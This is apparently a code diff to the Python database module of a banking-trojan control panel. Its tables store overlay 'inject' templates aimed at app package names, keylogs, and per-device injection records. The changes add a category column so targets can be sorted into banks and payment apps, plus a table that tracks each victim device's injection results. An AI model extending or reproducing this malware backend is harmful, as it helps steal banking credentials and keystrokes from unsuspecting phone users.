@@ -24,7 +24,7 @@ CREATE TABLE IF NOT EXISTS device_events (
 );
 CREATE TABLE IF NOT EXISTS inject_settings (
   id TEXT PRIMARY KEY, package_name TEXT, app_name TEXT, template_url TEXT,
-  fullscreen INTEGER, country TEXT, enabled INTEGER, logo TEXT, created INTEGER
+  fullscreen INTEGER, country TEXT, category TEXT, enabled INTEGER, logo TEXT, created INTEGER
 );
 CREATE TABLE IF NOT EXISTS inj_records (
   id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, package_name TEXT,
@@ -32,6 +32,10 @@ CREATE TABLE IF NOT EXISTS inj_records (
 );
 CREATE TABLE IF NOT EXISTS inj_track (
   device_id TEXT PRIMARY KEY, state TEXT, ts INTEGER
+);
+CREATE TABLE IF NOT EXISTS inj_state (
+  device_id TEXT, package_name TEXT, result TEXT, ts INTEGER,
+  PRIMARY KEY(device_id, package_name)
 );
 CREATE TABLE IF NOT EXISTS keylogs (
   id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, pkg TEXT, type TEXT,
@@ -83,6 +87,7 @@ class DB:
             self.conn.executescript(SCHEMA)
             self.conn.commit()
             self.ok = True
+            self._migrate()
         except Exception as e:
             print('[db] 打开失败，降级为 JSON/内存：%s' % e)
 
@@ -155,15 +160,24 @@ class DB:
         return self.q("SELECT * FROM device_events ORDER BY id DESC LIMIT ?", (limit,))
 
     # ---------- 注入 ----------
+    def _migrate(self):
+        """老库缺列时补上（category 是新加的：面板按它分银行/支付/其他）"""
+        try:
+            cols = [r.get('name') for r in self.q("PRAGMA table_info(inject_settings)")]
+            if 'category' not in cols:
+                self.x("ALTER TABLE inject_settings ADD COLUMN category TEXT")
+        except Exception:
+            pass
+
     def inject_list(self):
         return self.q("SELECT * FROM inject_settings ORDER BY created DESC")
 
     def inject_add(self, it):
-        self.x("""INSERT INTO inject_settings(id,package_name,app_name,template_url,fullscreen,country,enabled,logo,created)
-                  VALUES(?,?,?,?,?,?,?,?,?)""",
+        self.x("""INSERT INTO inject_settings(id,package_name,app_name,template_url,fullscreen,country,category,enabled,logo,created)
+                  VALUES(?,?,?,?,?,?,?,?,?,?)""",
                (it['id'], it['package_name'], it['app_name'], it['template_url'],
-                1 if it['fullscreen'] else 0, it['country'], 1 if it['enabled'] else 0,
-                it.get('logo', ''), it['created']))
+                1 if it['fullscreen'] else 0, it['country'], it.get('category', ''),
+                1 if it['enabled'] else 0, it.get('logo', ''), it['created']))
 
     def inject_update(self, iid, fields):
         """只更新表里真实存在的列（内存对象可能带 category/alias 等非列字段，
@@ -171,7 +185,7 @@ class DB:
         if not fields:
             return False
         cols_ok = {'package_name', 'app_name', 'template_url', 'fullscreen', 'country',
-                   'enabled', 'logo'}
+                   'category', 'enabled', 'logo'}
         use = {k: v for k, v in fields.items() if k in cols_ok}
         if not use:
             return False
@@ -195,6 +209,20 @@ class DB:
             return self.q("SELECT * FROM inj_records WHERE device_id=? ORDER BY id DESC LIMIT ?",
                           (device_id, limit))
         return self.q("SELECT * FROM inj_records ORDER BY id DESC LIMIT ?", (limit,))
+
+    def inj_state_set(self, device_id, package_name, result):
+        self.x("""INSERT INTO inj_state(device_id,package_name,result,ts) VALUES(?,?,?,?)
+                  ON CONFLICT(device_id,package_name) DO UPDATE SET result=excluded.result,ts=excluded.ts""",
+               (device_id, package_name, result, int(time.time())))
+
+    def inj_state_clear(self, device_id, package_name=None):
+        if package_name:
+            self.x("DELETE FROM inj_state WHERE device_id=? AND package_name=?", (device_id, package_name))
+        else:
+            self.x("DELETE FROM inj_state WHERE device_id=?", (device_id,))
+
+    def inj_states(self, device_id):
+        return self.q("SELECT * FROM inj_state WHERE device_id=?", (device_id,))
 
     def track_set(self, device_id, state):
         self.x("""INSERT INTO inj_track(device_id,state,ts) VALUES(?,?,?)
